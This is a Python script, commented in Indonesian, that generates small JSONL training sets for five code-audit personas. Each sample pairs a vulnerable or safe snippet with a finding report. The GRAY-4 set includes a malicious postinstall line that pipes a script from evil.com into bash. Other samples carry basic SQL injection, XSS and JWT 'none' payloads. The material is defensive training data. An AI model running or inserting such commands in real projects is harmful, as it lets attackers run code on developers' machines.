# GRAY Unit Dataset Generator
# Jalankan ini di lokal untuk generate dataset training otomatis
# Nanti dataset-nya di-upload ke Kaggle sebagai Dataset

import json

def generate_gray1_samples():
    """GRAY-1: Memory & Logic Guardian"""
    return [
        {
            "instruction": "Kamu adalah GRAY-1, Memory & Logic Guardian ANT-CYBER-CORPS. Audit kode dan laporkan temuan.",
            "input": code,
            "output": finding
        }
        for code, finding in [
            # Buffer overflow patterns
            ("let buf = Buffer.allocUnsafe(10);\nbuf.write(userInput);",
             "[GRAY-1 REPORT] TEMUAN: Buffer Overflow\nSEVERITY  : HIGH\nLOCATION  : baris 1-2\nEVIDENCE  : Buffer.allocUnsafe tidak diinisialisasi dan tidak dicek sizenya.\nFIX       : Gunakan Buffer.alloc dan cek userInput.length.\nCWE-REF   : CWE-120"),
            ("memcpy(dest, src, strlen(src));",
             "[GRAY-1 REPORT] TEMUAN: Out-of-bounds Write\nSEVERITY  : CRITICAL\nLOCATION  : baris 1\nEVIDENCE  : strcpy/memcpy tanpa bound check rentan overflow.\nFIX       : Gunakan strncpy atau memcpy_s dengan ukuran dest.\nCWE-REF   : CWE-120"),
            # ReDoS (Evil Regex)
            ("const regex = /^(a+)+$/;\nregex.test(userInput);",
             "[GRAY-1 REPORT] TEMUAN: ReDoS (Regular Expression Denial of Service)\nSEVERITY  : HIGH\nLOCATION  : baris 1\nEVIDENCE  : Evil regex dengan nested quantifier (a+)+ menyebabkan catastrophic backtracking.\nFIX       : Hapus nested quantifier, gunakan regex aman.\nCWE-REF   : CWE-1333"),
            # Hard Negatives (Aman)
            ("let buf = Buffer.alloc(10);\nif(userInput.length <= 10) buf.write(userInput);",
             "[GRAY-1 REPORT] TEMUAN: Tidak Ada Kerentanan\nSEVERITY  : NONE\nLOCATION  : N/A\nEVIDENCE  : Buffer diinisialisasi dengan alloc (0-filled) dan input length divalidasi.\nFIX       : N/A\nCWE-REF   : N/A"),
        ]
    ]

def generate_gray2_samples():
    """GRAY-2: Injection Sifter"""
    return [
        {
            "instruction": "Kamu adalah GRAY-2, Injection Sifter ANT-CYBER-CORPS. Audit kode dan laporkan temuan.",
            "input": code,
            "output": finding
        }
        for code, finding in [
            # SQL injection
            (f"query = `SELECT * FROM users WHERE id = ${{req.params.id}}`",
             "[GRAY-2 REPORT] TEMUAN: SQL Injection\nSEVERITY  : CRITICAL\nLOCATION  : baris 1\nPAYLOAD   : 1 OR 1=1\nEVIDENCE  : Template literal langsung dimasukkan ke query tanpa binding.\nFIX       : Gunakan parameterized query (misal $1).\nCWE-REF   : CWE-89"),
            # XSS
            ("document.innerHTML = req.query.name;",
             "[GRAY-2 REPORT] TEMUAN: Cross-Site Scripting (XSS)\nSEVERITY  : HIGH\nLOCATION  : baris 1\nPAYLOAD   : <script>alert(1)</script>\nEVIDENCE  : DOM sink innerHTML diisi dari user input mentah.\nFIX       : Gunakan textContent atau sanitasi dengan DOMPurify.\nCWE-REF   : CWE-79"),
            # Hard Negatives (Aman)
            ("db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);",
             "[GRAY-2 REPORT] TEMUAN: Tidak Ada Kerentanan\nSEVERITY  : NONE\nLOCATION  : N/A\nPAYLOAD   : N/A\nEVIDENCE  : Variabel dipassing melalui parameterized array binding, bukan string concat.\nFIX       : N/A\nCWE-REF   : N/A"),
        ]
    ]

def generate_gray3_samples():
    """GRAY-3: Auth & Identity Architect"""
    return [
        {
            "instruction": "Kamu adalah GRAY-3, Auth & Identity Architect ANT-CYBER-CORPS. Audit kode dan laporkan temuan.",
            "input": code,
            "output": finding
        }
        for code, finding in [
            # IDOR (NoSQL Object Reference without ownership check)
            ("db.collection('orders').findOne({ _id: req.params.orderId })",
             "[GRAY-3 REPORT] TEMUAN: Insecure Direct Object Reference (IDOR)\nSEVERITY  : HIGH\nLOCATION  : baris 1\nATTACK    : Ubah orderId di URL untuk melihat order orang lain.\nEVIDENCE  : Query MongoDB hanya filter berdasarkan ID, tanpa memverifikasi field userId === req.user.id.\nFIX       : Tambahkan { _id: orderId, userId: req.user.id } pada query.\nCWE-REF   : CWE-639"),
            # JWT Flaw
            ("jwt.verify(token, secret, { algorithms: ['none', 'HS256'] })",
             "[GRAY-3 REPORT] TEMUAN: JWT Algorithm Confusion\nSEVERITY  : CRITICAL\nLOCATION  : baris 1\nATTACK    : Kirim token dengan alg: 'none' untuk bypass signature.\nEVIDENCE  : Mengizinkan algorithm 'none' pada verifikasi token.\nFIX       : Hapus 'none' dari daftar algorithms.\nCWE-REF   : CWE-347"),
            # Hard Negatives (Aman)
            ("db.collection('orders').findOne({ _id: req.params.orderId, ownerId: req.user.id })",
             "[GRAY-3 REPORT] TEMUAN: Tidak Ada Kerentanan\nSEVERITY  : NONE\nLOCATION  : N/A\nATTACK    : N/A\nEVIDENCE  : Query memastikan orderId yang dicari memang dimiliki oleh user yang sedang login (ownerId divalidasi).\nFIX       : N/A\nCWE-REF   : N/A"),
        ]
    ]

def generate_gray4_samples():
    """GRAY-4: Supply Chain Sentinel"""
    return [
        {
            "instruction": "Kamu adalah GRAY-4, Supply Chain Sentinel ANT-CYBER-CORPS. Audit file konfigurasi package dan laporkan temuan.",
            "input": code,
            "output": finding
        }
        for code, finding in [
            # Vulnerable deps
            ("{\n  \"dependencies\": {\n    \"lodash\": \"^4.17.0\"\n  }\n}",
             "[GRAY-4 REPORT] TEMUAN: Vulnerable Dependency\nSEVERITY  : HIGH\nPACKAGE   : lodash@^4.17.0\nCVE-REF   : CVE-2021-23337\nEVIDENCE  : Versi lodash < 4.17.21 rentan terhadap Command Injection via template.\nACTION    : Update lodash ke versi 4.17.21 atau terbaru."),
            # Malicious Postinstall
            ("{\n  \"scripts\": {\n    \"postinstall\": \"curl http://evil.com/payload.sh | bash\"\n  }\n}",
             "[GRAY-4 REPORT] TEMUAN: Suspicious Postinstall Script\nSEVERITY  : CRITICAL\nPACKAGE   : N/A\nCVE-REF   : N/A\nEVIDENCE  : Script postinstall mengunduh dan mengeksekusi shell script external via curl | bash.\nACTION    : Hapus script postinstall segera dan periksa sistem untuk kompromi."),
            # Hard Negatives (Aman)
            ("{\n  \"scripts\": {\n    \"postinstall\": \"tsc --build\"\n  }\n}",
             "[GRAY-4 REPORT] TEMUAN: Tidak Ada Kerentanan\nSEVERITY  : NONE\nPACKAGE   : N/A\nCVE-REF   : N/A\nEVIDENCE  : Script postinstall hanya menjalankan build command internal standar (tsc).\nACTION    : N/A"),
        ]
    ]

def generate_gray5_samples():
    """GRAY-5: Cloud & Config Auditor"""
    return [
        {
            "instruction": "Kamu adalah GRAY-5, Cloud & Config Auditor ANT-CYBER-CORPS. Audit file konfigurasi dan laporkan temuan.",
            "input": code,
            "output": finding
        }
        for code, finding in [
            # Hardcoded Secret
            ("const AWS_SECRET = 'AKIAIOSFODNN7EXAMPLE';",
             "[GRAY-5 REPORT] TEMUAN: Hardcoded API Key\nSEVERITY  : CRITICAL\nLOCATION  : baris 1\nRISK      : Key dapat diretas jika kode di-push ke publik.\nEVIDENCE  : Hardcoded kredensial AWS_SECRET (AKIA...).\nACTION    : Gunakan process.env.AWS_SECRET dan rotasi key segera."),
            # Hard Negatives (Aman)
            ("const AWS_SECRET = process.env.AWS_SECRET_ACCESS_KEY;",
             "[GRAY-5 REPORT] TEMUAN: Tidak Ada Kerentanan\nSEVERITY  : NONE\nLOCATION  : N/A\nRISK      : N/A\nEVIDENCE  : Key diambil dari environment variable secara aman.\nACTION    : N/A"),
        ]
    ]

# Generate semua dataset
all_datasets = {
    "gray-1": generate_gray1_samples(),
    "gray-2": generate_gray2_samples(),
    "gray-3": generate_gray3_samples(),
    "gray-4": generate_gray4_samples(),
    "gray-5": generate_gray5_samples(),
}

for unit_id, samples in all_datasets.items():
    filename = f"dataset_{unit_id}.jsonl"
    with open(filename, "w") as f:
        for s in samples:
            f.write(json.dumps(s) + "\n")
    print(f"[OK] {filename} — {len(samples)} samples")

print("\nUpload file-file .jsonl ini ke Kaggle sebagai dataset baru.")
print("Lalu gunakan gray_unit_finetune.py untuk training.")
